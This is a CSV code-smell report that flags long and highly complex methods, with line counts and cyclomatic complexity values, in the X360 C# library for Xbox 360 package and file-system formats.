Implementation smell,Namespace,Class,File,Method,Description
Long Method,X360.Profile,GPD,C:\repos\mtolly_X360\X360\X360\Profile\GPD.cs,GPD,The method has 147 lines of code.
Long Method,X360.Profile,GPD,C:\repos\mtolly_X360\X360\X360\Profile\GPD.cs,xAddSetting,The method has 131 lines of code.
Long Method,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,SwitchNWrite,The method has 167 lines of code.
Long Method,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,STFSPackage,The method has 125 lines of code.
Long Method,X360.SVOD,CreateSVOD,C:\repos\mtolly_X360\X360\X360\SVOD\Create.cs,Create,The method has 126 lines of code.
Complex Method,X360.FATX,FATXFileEntry,C:\repos\mtolly_X360\X360\X360\FATX\Entries.cs,xInject,Cyclomatic complexity of the method is 10
Complex Method,X360.FATX,FATXFileEntry,C:\repos\mtolly_X360\X360\X360\FATX\Entries.cs,GetSTFSName,Cyclomatic complexity of the method is 23
Complex Method,X360.FATX,FATXFolderEntry,C:\repos\mtolly_X360\X360\X360\FATX\Entries.cs,xRead,Cyclomatic complexity of the method is 9
Complex Method,X360.FATX,FATXPartition,C:\repos\mtolly_X360\X360\X360\FATX\Entries.cs,FATXPartition,Cyclomatic complexity of the method is 12
Complex Method,X360.FATX,AllocationTable,C:\repos\mtolly_X360\X360\X360\FATX\Entries.cs,GetBlocks,Cyclomatic complexity of the method is 9
Complex Method,X360.FATX,AllocationTable,C:\repos\mtolly_X360\X360\X360\FATX\Entries.cs,WriteChain,Cyclomatic complexity of the method is 10
Complex Method,X360.FATX,AllocationTable,C:\repos\mtolly_X360\X360\X360\FATX\Entries.cs,GetNewBlockChain,Cyclomatic complexity of the method is 10
Complex Method,X360.FATX,FATXManagement,C:\repos\mtolly_X360\X360\X360\FATX\Management.cs,IsFATX,Cyclomatic complexity of the method is 13
Complex Method,X360.FATX,FATXDrive,C:\repos\mtolly_X360\X360\X360\FATX\Management.cs,xReadToFolder,Cyclomatic complexity of the method is 20
Complex Method,X360.FATX,FATXDrive,C:\repos\mtolly_X360\X360\X360\FATX\Management.cs,LoadPartitions,Cyclomatic complexity of the method is 16
Complex Method,X360.GDFX,GDFImage,C:\repos\mtolly_X360\X360\X360\GDFX\GDFImage.cs,GDFImage,Cyclomatic complexity of the method is 11
Complex Method,X360.GDFX,GDFImage,C:\repos\mtolly_X360\X360\X360\GDFX\GDFImage.cs,ReadFolder,Cyclomatic complexity of the method is 8
Complex Method,X360.GDFX,GDFImage,C:\repos\mtolly_X360\X360\X360\GDFX\GDFImage.cs,GetFile,Cyclomatic complexity of the method is 10
Complex Method,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadString,Cyclomatic complexity of the method is 11
Complex Method,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,IsValidXboxName,Cyclomatic complexity of the method is 8
Complex Method,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,ReadFileType,Cyclomatic complexity of the method is 33
Complex Method,X360.Profile,GameGPD,C:\repos\mtolly_X360\X360\X360\Profile\GameGPD.cs,xErase,Cyclomatic complexity of the method is 11
Complex Method,X360.Profile,Setting,C:\repos\mtolly_X360\X360\X360\Profile\GPD.cs,LoadDetails,Cyclomatic complexity of the method is 32
Complex Method,X360.Profile,Setting,C:\repos\mtolly_X360\X360\X360\Profile\GPD.cs,xUpdate,Cyclomatic complexity of the method is 33
Complex Method,X360.Profile,GPD,C:\repos\mtolly_X360\X360\X360\Profile\GPD.cs,GPD,Cyclomatic complexity of the method is 55
Complex Method,X360.Profile,GPD,C:\repos\mtolly_X360\X360\X360\Profile\GPD.cs,GetEntries,Cyclomatic complexity of the method is 15
Complex Method,X360.Profile,GPD,C:\repos\mtolly_X360\X360\X360\Profile\GPD.cs,UpdateSync,Cyclomatic complexity of the method is 19
Complex Method,X360.Profile,GPD,C:\repos\mtolly_X360\X360\X360\Profile\GPD.cs,ContainsEntry,Cyclomatic complexity of the method is 17
Complex Method,X360.Profile,GPD,C:\repos\mtolly_X360\X360\X360\Profile\GPD.cs,xAddSetting,Cyclomatic complexity of the method is 38
Complex Method,X360.Profile,GPD,C:\repos\mtolly_X360\X360\X360\Profile\GPD.cs,AddString,Cyclomatic complexity of the method is 9
Complex Method,X360.Profile,GPD,C:\repos\mtolly_X360\X360\X360\Profile\GPD.cs,xDeleteSetting,Cyclomatic complexity of the method is 8
Complex Method,X360.STFS,BlockRecord,C:\repos\mtolly_X360\X360\X360\STFS\STFSDescriptor.cs,Switch,Cyclomatic complexity of the method is 9
Complex Method,X360.STFS,STFSDescriptor,C:\repos\mtolly_X360\X360\X360\STFS\STFSDescriptor.cs,XSetStructure,Cyclomatic complexity of the method is 8
Complex Method,X360.STFS,STFSDescriptor,C:\repos\mtolly_X360\X360\X360\STFS\STFSDescriptor.cs,STFSDescriptor,Cyclomatic complexity of the method is 10
Complex Method,X360.STFS,STFSDescriptor,C:\repos\mtolly_X360\X360\X360\STFS\STFSDescriptor.cs,GenerateHashBlock,Cyclomatic complexity of the method is 8
Complex Method,X360.STFS,STFSDescriptor,C:\repos\mtolly_X360\X360\X360\STFS\STFSDescriptor.cs,GenerateHashOffset,Cyclomatic complexity of the method is 10
Complex Method,X360.STFS,FileEntry,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,FixHashes,Cyclomatic complexity of the method is 12
Complex Method,X360.STFS,HeaderData,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,read,Cyclomatic complexity of the method is 12
Complex Method,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,xEntriesToFile,Cyclomatic complexity of the method is 11
Complex Method,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,VerifySignature,Cyclomatic complexity of the method is 12
Complex Method,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,xWriteHeader,Cyclomatic complexity of the method is 8
Complex Method,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,SwitchNWrite,Cyclomatic complexity of the method is 19
Complex Method,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,GetRecord,Cyclomatic complexity of the method is 8
Complex Method,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,xAllocateBlocks,Cyclomatic complexity of the method is 8
Complex Method,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,STFSPackage,Cyclomatic complexity of the method is 10
Complex Method,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,STFSPackage,Cyclomatic complexity of the method is 19
Complex Method,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,VerifyHashTables,Cyclomatic complexity of the method is 12
Complex Method,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,VerifyHeader,Cyclomatic complexity of the method is 8
Complex Method,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,AddFolder,Cyclomatic complexity of the method is 10
Complex Method,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,GetFolder,Cyclomatic complexity of the method is 8
Complex Method,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,GetFiles,Cyclomatic complexity of the method is 8
Complex Method,X360.STFS,ProfilePackage,C:\repos\mtolly_X360\X360\X360\Profile\ProfilePackage.cs,LoadProfile,Cyclomatic complexity of the method is 14
Complex Method,X360.STFS,ProfilePackage,C:\repos\mtolly_X360\X360\X360\Profile\ProfilePackage.cs,SaveProfileInfo,Cyclomatic complexity of the method is 10
Complex Method,X360.STFS,RSAParams,C:\repos\mtolly_X360\X360\X360\STFS\STFSStuff.cs,RSAParams,Cyclomatic complexity of the method is 9
Complex Method,X360.SVOD,CreateSVOD,C:\repos\mtolly_X360\X360\X360\SVOD\Create.cs,Create,Cyclomatic complexity of the method is 16
